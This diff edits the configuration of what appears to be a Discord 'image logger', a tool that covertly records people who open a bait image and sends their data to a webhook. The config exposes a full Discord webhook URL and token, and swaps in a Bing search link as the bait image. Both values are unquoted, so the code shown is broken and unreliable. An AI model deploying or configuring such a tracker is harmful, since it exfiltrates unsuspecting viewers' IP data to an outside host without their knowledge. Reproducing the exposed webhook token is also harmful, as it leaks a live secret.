@@ -13,7 +13,7 @@ __author__ = "C00lB0i"
 config = {
     # BASE CONFIG #
     "webhook": https://discord.com/api/webhooks/1419514815948394567/jPIySUzZjDdlOjjAobQiGR8OuV_08TQ_-TJWYAFhYciWMobEiYnEk2vJeAcVaR9EZLhg
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "image": https://www.bing.com/images/search?view=detailV2&ccid=N3GrPtQB&id=C77457757F2397BF58BADD72521330F625777291&thid=OIP.N3GrPtQBei8KDqT71dI1LgHaFj&mediaurl=https%3A%2F%2Fwww.saversplanet.com%2Fwallpapers%2Fsunset-bliss-wallpapers_7251_1600x1200.jpg&cdnurl=https%3A%2F%2Fth.bing.com%2Fth%2Fid%2FR.3771ab3ed4017a2f0a0ea4fbd5d2352e%3Frik%3DkXJ3JfYwE1Jy3Q%26pid%3DImgRaw%26r%3D0&exph=1200&expw=1600&q=Bliss+Sunset&FORM=IRPRST&ck=9BE3BE185DFBD31FC42BD0C7BF768637&selectedIndex=1&itb=0&cw=2297&ch=1183&ajaxhist=0&ajaxserp=0", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
